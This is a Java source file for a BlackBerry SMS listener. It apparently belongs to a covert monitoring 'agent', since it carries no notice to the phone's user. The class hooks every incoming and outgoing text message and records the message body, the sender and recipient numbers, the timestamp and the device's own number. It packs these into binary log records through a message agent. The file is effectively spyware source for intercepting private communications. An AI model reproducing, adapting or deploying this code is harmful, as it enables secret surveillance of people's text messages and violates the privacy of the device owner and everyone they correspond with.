//#preprocess
package blackberry.agent.sms;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.util.Date;

import javax.microedition.io.Connector;
import javax.wireless.messaging.BinaryMessage;
import javax.wireless.messaging.MessageConnection;
import javax.wireless.messaging.TextMessage;

import net.rim.blackberry.api.phone.Phone;
import net.rim.device.api.system.RuntimeStore;
import net.rim.device.api.util.DataBuffer;
import blackberry.agent.MessageAgent;
import blackberry.log.LogType;
import blackberry.utils.Check;
import blackberry.utils.DateTime;
import blackberry.utils.Debug;
import blackberry.utils.DebugLevel;
import blackberry.utils.Utils;
import blackberry.utils.WChar;

public class SmsListener {
    
    private static final int SMS_VERSION = 2010050501;

    //#ifdef DEBUG
    static Debug debug = new Debug("SmsListener", DebugLevel.VERBOSE);
    //#endif

    MessageConnection smsconn;
    //SMSINListener insms;
    //SMSOUTListener outsms;
    Thread inThread;
    SMSInOutListener inoutsms;

    MessageAgent messageAgent;

    static SmsListener instance;

    private SmsListener() {
    };

    public void setMessageAgent(final MessageAgent messageAgent) {
        this.messageAgent = messageAgent;
    }

    public static SmsListener getInstance() {
        
        if (instance == null) {
            SmsListener singleton = new SmsListener();
                        
            instance = singleton;
        }

        return instance;
    }

    public final void start() {
        try {
            smsconn = (MessageConnection) Connector.open("sms://:0");

            //#ifdef DEBUG_TRACE
            debug.trace("start: SMSListener");
            //#endif
            inoutsms = new SMSInOutListener(smsconn, this);
            //outsms = new SMSOUTListener(this);
             // insms = new SMSINListener(smsconn, this);

        } catch (final IOException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }

        inThread = new Thread(inoutsms);
        inThread.start();

        try {
            smsconn.setMessageListener(inoutsms);
        } catch (final IOException e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        }
    }

    public final void stop() {
        //#ifdef DEBUG_INFO
        debug.info("Stopping SMSListener");
        //#endif
        try {
            if (smsconn != null) {
                //#ifdef DEBUG_TRACE
                debug.trace("stop: smsconn");
                //#endif
                smsconn.close();
            }
            if (inoutsms != null) {
                //#ifdef DEBUG_TRACE
                debug.trace("stop: inoutsms");
                //#endif
                inoutsms.stop();
            }

            if (inThread != null) {
                //#ifdef DEBUG_TRACE
                debug.trace("stop: joining inThread");
                //#endif

                inThread.join();

                //#ifdef DEBUG_TRACE
                debug.trace("stop: joined inThread");
                //#endif
            }

        } catch (final Exception e) {
            //#ifdef DEBUG_ERROR
            debug.error(e);
            //#endif
        } finally {
            smsconn = null;
            inoutsms = null;
        }
    }

    public void run() {

    }

    synchronized void saveLog(final javax.wireless.messaging.Message message,
            final boolean incoming) {
        //String msg = null;

        byte[] dataMsg = null;

        //#ifdef DEBUG_TRACE
        debug.trace("saveLog: " + message);
        //#endif

        if (message instanceof TextMessage) {
            final TextMessage tm = (TextMessage) message;
            String msg = tm.getPayloadText();
            //#ifdef DEBUG_INFO
            debug.info("Got Text SMS: " + msg);
            //#endif

            dataMsg = WChar.getBytes(msg);

        } else if (message instanceof BinaryMessage) {
            dataMsg = ((BinaryMessage) message).getPayloadData();

            try {

                //String msg16 = new String(data, "UTF-16BE");
                String msg8 = new String(dataMsg, "UTF-8");

                //#ifdef DEBUG_TRACE
                //debug.trace("saveLog msg16:" + msg16);
                debug.trace("saveLog msg8:" + msg8);
                //#endif

            } catch (final UnsupportedEncodingException e) {
                //#ifdef DEBUG_ERROR
                debug.error("saveLog:" + e);
                //#endif
            }
            //#ifdef DEBUG_INFO
            debug.info("Got Binary SMS, len: " + dataMsg.length);
            //#endif
        }

        final ByteArrayOutputStream os = null;
        try {

            final int flags = incoming ? 1 : 0;

            DateTime filetime = null;
            final int additionalDataLen = 48;
            final byte[] additionalData = new byte[additionalDataLen];

            String from;
            String to;
            String address = message.getAddress();

            final String prefix = "sms://";
            if (address.indexOf(prefix) == 0) {
                address = address.substring(prefix.length());
            }

            if (incoming) {
                from = address;
                to = getMyAddress();
                filetime = new DateTime(message.getTimestamp());
            } else {
                from = getMyAddress();
                to = address;
                filetime = new DateTime(new Date());
            }

            //#ifdef DBC
            Check.asserts(filetime != null, "saveLog: null filetime");
            //#endif

            final DataBuffer databuffer = new DataBuffer(additionalData, 0,
                    additionalDataLen, false);
            databuffer.writeInt(SMS_VERSION);
            databuffer.writeInt(flags);
            databuffer.writeLong(filetime.getFiledate());
            databuffer.write(Utils.padByteArray(from, 16));
            databuffer.write(Utils.padByteArray(to, 16));

            //#ifdef DEBUG_INFO
            debug.info("sms : " + (incoming ? "incoming" : "outgoing"));
            debug.info("From: " + from + " To: " + to + " date: "
                    + filetime.toString());
            //#endif

            Check.ensures(databuffer.getLength() == additionalDataLen,
                    "SMS Wrong databuffer size: " + databuffer.getLength());
            Check.ensures(additionalData.length == additionalDataLen,
                    "SMS Wrong buffer size: " + additionalData.length);

            if (dataMsg != null) {
                messageAgent
                        .createLog(additionalData, dataMsg, LogType.SMS_NEW);
            } else {
                //#ifdef DEBUG_ERROR
                debug.error("data null");
                //#endif
            }

        } catch (final Exception ex) {
            //#ifdef DEBUG_ERROR
            debug.error("saveLog message: " + ex);
            //#endif

        } finally {
            if (os != null) {
                try {
                    os.close();
                } catch (final IOException e) {
                }
            }
        }
    }

    private String getMyAddress() {
        final String number = Phone.getDevicePhoneNumber(false);
        if (number == null || number.startsWith("Unknown")) {
            return "local";
        }

        //#ifdef DBC
        Check
                .ensures(number.length() <= 16, "getMyAddress too long: "
                        + number);
        //#endif

        return number;
    }

}
